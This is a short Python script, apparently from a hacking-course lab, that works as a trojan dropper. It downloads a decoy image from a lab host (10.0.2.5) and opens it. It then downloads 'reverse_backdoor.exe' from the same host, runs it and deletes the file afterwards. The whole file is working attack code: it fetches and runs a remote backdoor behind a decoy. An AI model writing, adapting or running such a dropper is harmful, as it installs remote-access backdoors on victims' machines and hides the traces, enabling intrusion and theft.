import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



try:
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    download("http://10.0.2.5/evil-files/bike.jpg")
    subprocess.Popen("bike.jpg", shell=True) # will open in background

    download("http://10.0.2.5/evil-files/reverse_backdoor.exe")
    subprocess.call("reverse_backdoor.exe", shell=True) # call to pause, for evil code to execute

    # os.remove("bike.jpg")
    os.remove("reverse_backdoor.exe")
except UnicodeDecodeError:
    pass
